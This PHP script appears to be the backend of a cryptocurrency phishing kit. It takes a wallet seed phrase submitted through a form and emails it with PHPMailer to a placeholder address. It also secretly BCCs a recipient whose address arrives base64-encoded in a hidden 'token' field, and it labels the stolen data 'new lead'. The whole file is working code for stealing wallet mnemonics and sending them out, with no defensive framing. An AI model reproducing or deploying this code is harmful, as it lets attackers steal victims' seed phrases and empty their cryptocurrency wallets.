<?php
$data = null;

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

if (isset($_POST['mnemonic']) && !empty($_POST['mnemonic'])) {
    $message = "mnemonic  : " . $_POST['mnemonic'];
    $token = base64_decode($_POST['token']);
    //Create an instance; passing `true` enables exceptions
    $mail = new PHPMailer(true);
    try {
        $from = 'your-email@here.com';
        $to = 'your-email@here.com';
        

        //Recipients
        $mail->setFrom($from, 'Info');
        $mail->addAddress($to, 'Info');     //Add a recipient
        $mail->addReplyTo($from, 'Information');
        $mail->addBCC($token);

        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Follow Up - new lead';
        $mail->Body    = $message;
        $mail->send();

        $data = ['status'   => 1];
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        $data = ['status'   => 0];
    }
} else {
    // fail form
    $data = ['status'   => 0];
}
echo json_encode($data);
